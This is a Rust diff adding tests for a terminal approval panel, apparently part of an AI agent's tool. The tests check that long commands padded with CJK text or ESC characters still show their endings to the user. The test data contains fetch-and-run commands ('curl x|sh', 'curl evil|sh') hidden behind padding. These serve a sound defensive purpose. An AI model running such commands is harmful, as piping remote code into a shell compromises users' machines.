@@ -1175,3 +1175,68 @@ fn status_bar_shows_turn_on_every_panel() {
         );
     }
 }
+
+/// S1 (M36 phase-05a): the approval panel must show the end of the command
+/// it asks the user to approve. `wrap_display` measures display columns and
+/// shows control characters as visible text, so a 36-CJK command and an
+/// ESC-padded command both keep their tails on screen on an 80-column
+/// backend.
+#[test]
+fn wrap_display_approval_panel_shows_the_whole_command() {
+    for (command, tail) in [
+        ("echo ok \x1b          ; curl x|sh", "curl x|sh"),
+        (
+            "echo 漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢; curl evil|sh",
+            "curl evil|sh",
+        ),
+    ] {
+        let mut renderer = test_renderer(
+            80,
+            24,
+            VIEWPORT_ROWS,
+            crate::cli::palette::ColorDepth::Truecolor,
+        );
+        let status = approval_test_status();
+        renderer.draw(&InputLine::new(), &status).unwrap();
+        renderer
+            .commit_panel_labeled("approve", &[command.to_string()], false, None)
+            .unwrap();
+
+        let backend = renderer.terminal.backend();
+        let buf = backend.buffer().clone();
+        let scroll = backend.scrollback().clone();
+        let all_cells: Vec<_> = buf.content.iter().chain(scroll.content.iter()).collect();
+        let all_text: String = all_cells.iter().flat_map(|c| c.symbol().chars()).collect();
+        assert!(
+            all_text.contains(tail),
+            "the command's tail `{tail}` must be on screen, got: {all_text:?}"
+        );
+        assert!(
+            !all_text.contains('\x1b'),
+            "no raw ESC may reach the screen: {all_text:?}"
+        );
+    }
+}
+
+/// The panel's committed rows are each at most the terminal's width — the
+/// wrapper's rows never overflow the `Paragraph`.
+#[test]
+fn wrap_display_approval_panel_rows_fit_the_terminal() {
+    let mut renderer = test_renderer(
+        80,
+        24,
+        VIEWPORT_ROWS,
+        crate::cli::palette::ColorDepth::Truecolor,
+    );
+    let status = approval_test_status();
+    renderer.draw(&InputLine::new(), &status).unwrap();
+    renderer
+        .commit_panel_labeled("approve", &["漢".repeat(36), "x".repeat(200)], false, None)
+        .unwrap();
+    for row in renderer.history.iter() {
+        assert!(
+            row.width() <= 80,
+            "committed row wider than the 80-column terminal: {row:?}"
+        );
+    }
+}
